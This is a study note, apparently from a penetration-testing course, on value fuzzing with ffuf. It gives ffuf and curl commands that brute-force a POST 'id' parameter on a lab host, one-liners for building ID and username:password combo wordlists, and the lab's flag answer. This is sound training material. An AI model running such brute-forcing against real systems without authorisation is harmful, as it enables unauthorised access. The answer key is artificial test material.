# LAB — Value Fuzzing

## ID
12

## Module
Ffuf

## Kind
lab

## Title
Section 12 — Value Fuzzing

## Description
Once a parameter name is known, fuzz its **value** — using a custom wordlist (e.g. numeric IDs 1–1000, names, tokens) to find the magic input.

## Tags
ffuf, value-fuzzing, custom-wordlist, lab, ids

## Commands
- `for i in $(seq 1 1000); do echo $i >> ids.txt; done`
- `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
- `curl -s 'http://admin.academy.htb:PORT/admin/admin.php' -X POST -d 'id=73' | grep 'HTB'`

## What This Section Covers
The parameter name alone often isn't enough — you need the **right value** to trigger the privileged code path. Pre-made value wordlists exist for usernames/passwords; for custom IDs/tokens, you make your own (bash one-liner generates 1–1000 in a file). FUZZ goes in the value position.

## Methodology
1. **Build a wordlist** matching the expected value type:
   - Numeric IDs: `for i in $(seq 1 1000); do echo $i >> ids.txt; done`
   - Usernames: `/opt/useful/seclists/Usernames/Names/names.txt`
   - Passwords: `/opt/useful/seclists/Passwords/...`
2. **Place FUZZ in the value slot:** `-d 'id=FUZZ'` (POST) or `?id=FUZZ` (GET).
3. **Filter the baseline** — wrong values usually return identical "Invalid id" responses; `-fs <baseline>`.
4. **Verify with curl** — once a hit is found, fire one curl request and grep for the flag/data.

## Custom wordlist generation tricks
| Need | One-liner |
|------|-----------|
| Numeric range | `seq 1 1000 > ids.txt` |
| Zero-padded IDs | `for i in $(seq -w 1 1000); do echo $i; done > ids.txt` |
| Year range | `seq 1970 2030 > years.txt` |
| Combo (username:password) | `for u in $(cat users); do for p in $(cat pw); do echo "$u:$p"; done; done > combos.txt` |

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag from value-fuzzing the `id` POST param | **HTB{p4r4m373r_fuzz1n6_15_k3y!}** | Generated `ids.txt` (1–1000), ran `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:STMPO/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768` → `id=73`. Confirmed: `curl -s http://admin.academy.htb:STMPO/admin/admin.php -X POST -d 'id=73' \| grep HTB` |

## Key Takeaways
- Value fuzzing is the closing step of the chain: directory → page → param → **value** → flag.
- Custom wordlists from `seq` cover most numeric-ID cases. Don't overthink it.
- After ffuf reports the hit, **always** re-issue with curl + grep to extract the actual data — ffuf shows hit/miss, not full body.

## Gotchas
- `seq 1 1000` writes 1000 lines — make sure the IDs in the app aren't 6+ digits or longer-format strings (UUIDs, hashes).
- A value hit with size **slightly different** from the baseline (e.g. baseline 768 → hit 787) is the right kind of divergence. A massive size jump might mean a server error page rather than success.
- When fuzzing names from `seclists`, check for case-sensitivity at the app layer — try lowercase first.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ffuf]]
← [[11-parameter-fuzzing-post]] | [[13-skills-assessment]] →
<!-- AUTO-LINKS-END -->
